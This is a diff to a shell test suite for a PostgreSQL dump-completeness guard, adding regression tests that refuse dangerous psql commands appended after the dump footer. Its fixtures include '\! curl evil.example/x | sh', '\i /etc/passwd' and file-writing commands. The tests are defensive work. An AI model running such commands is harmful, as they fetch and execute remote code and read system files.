@@ -222,11 +222,40 @@ cp "$TMP/t1.sql" "$TMP/-dash.sql"
 ( cd "$TMP" && pg_dump_is_complete "./-dash.sql" ) && ok "accepts a ./-dash.sql path" \
                                                   || no "accepts a ./-dash.sql path"
 
+echo "== NO REGRESSION: a dangerous psql command in the TRAILER is refused =="
+# The round-7 catch, and the sharpest of the whole review. Accepting any
+# backslash line as footer-shaped made this guard MORE PERMISSIVE than the
+# `tail -n5` window it replaces: appending `\! cmd` after a real footer pushes
+# the marker to the 6th-from-last line, so the OLD guard rejected the dump as
+# truncated and it never reached psql. Each fixture below therefore carries its
+# own regression witness — the old guard must REJECT it too, proving the new
+# guard is not newly blessing something the window caught.
+for evil in '\! curl evil.example/x | sh' '\!id' '\i /etc/passwd' '\i/etc/passwd' '\o /tmp/pwned' '\copy t TO /tmp/x' '\gexec' '\q'; do
+  # Fixture must mirror the PRODUCTION trailer exactly (4 lines follow the
+  # marker), or appending one line leaves the marker inside a 5-line window and
+  # the old guard still accepts — in which case there is no regression to prove.
+  { echo "-- PostgreSQL database dump"; echo "CREATE TABLE t (id int);"
+    echo "COPY t (id) FROM stdin;"; echo "1"; echo "\\."
+    echo "--"; echo "-- PostgreSQL database dump complete"; echo "--"; echo ""
+    echo "\\unrestrict QCYt5h0EDZIG3cZal9B"; echo ""; } > "$TMP/tr.sql"
+  printf '%s\n' "$evil" >> "$TMP/tr.sql"
+  if pg_dump_is_complete "$TMP/tr.sql"; then
+    no "refuses dangerous trailer [$evil]"
+  elif oldguard "$TMP/tr.sql"; then
+    no "fixture [$evil] is not a regression case — old guard accepted it, so this proves nothing"
+  else
+    ok "refuses dangerous trailer [$evil] (old guard refused it too — parity held)"
+  fi
+done
+
 echo "== non-letter psql trailers are footer-shaped too =="
 # `\` + a letter was still a token freeze: it admits \unrestrict only because
 # "u" is a letter, and would reject \; or \! (cage-match #157 r4, Tesla).
 i=0
-for meta in '\;' '\!' '\?' '\1'; do
+# NB: `\!` deliberately absent — it is a shell escape, refused by the
+# no-regression clause above. The point here is that a non-letter token is not
+# rejected merely for being non-letter.
+for meta in '\;' '\?' '\1'; do
   i=$((i + 1)); make_dump "$TMP/nl$i.sql" 1; printf '%s\n' "$meta" >> "$TMP/nl$i.sql"
   pg_dump_is_complete "$TMP/nl$i.sql" && ok "accepts non-letter trailer: $meta" \
                                       || no "accepts non-letter trailer: $meta"
